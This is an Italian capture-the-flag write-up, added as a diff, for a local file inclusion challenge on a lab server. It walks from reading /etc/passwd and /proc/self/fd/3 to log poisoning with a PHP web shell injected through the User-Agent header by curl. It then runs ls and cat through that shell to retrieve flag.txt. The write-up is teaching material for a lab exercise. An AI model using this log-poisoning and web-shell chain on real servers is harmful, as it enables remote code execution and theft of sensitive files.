@@ -1,0 +1,22 @@
+Esplorazione della vulnerabilità LFI:
+
+Dopo aver osservato l'URL /include?file=<path>, si deduce che è possibile specificare un file arbitrario come parametro per il parametro file.
+Viene subito verificato che questo possa essere utilizzato per includere file sensibili come /etc/passwd o file del sistema di processo come /proc/self/fd/3, che rappresenta il file descriptor aperto per il log.
+Identificazione del File Descriptor del Log:
+
+Dalla struttura del codice, vediamo che il file di log viene mantenuto aperto, con un numero di file descriptor noto e determinato in modo statico (3 in Linux, in questo caso).
+Per confermare, eseguiamo una richiesta verso il parametro file=/proc/self/fd/3 e osserviamo la risposta per capire che il contenuto del log è accessibile tramite LFI.
+Log Injection tramite l’Header User-Agent:
+
+Conoscendo il file di log aperto, iniettiamo codice PHP tramite l’header User-Agent di una richiesta, che sarà salvato nel log del server. Il comando usato è:
+curl -A "<?php system($_GET['cmd']); ?>" "http://192.168.1.111:5000/include?file=/proc/self/fd/3"
+In questo modo, la linea <?php system($_GET['cmd']); ?> viene scritta nel log e interpretata come codice eseguibile.
+Esecuzione del Codice Iniettato:
+
+Una volta iniettato il codice, torniamo a visitare http://192.168.1.111:5000/include?file=/proc/self/fd/3&cmd=ls.
+Il server esegue il comando ls all’interno della directory dell’applicazione, mostrando la cartella flags.
+Recupero della Flag:
+
+Ora ripetiamo l’accesso eseguendo il comando ls flags per ottenere il nome del file della flag (flag.txt).
+Infine, usiamo cat flags/flag.txt per leggere il contenuto della flag:
+http://192.168.1.111:5000/include?file=/proc/self/fd/3&cmd=cat%20flags/flag.txt
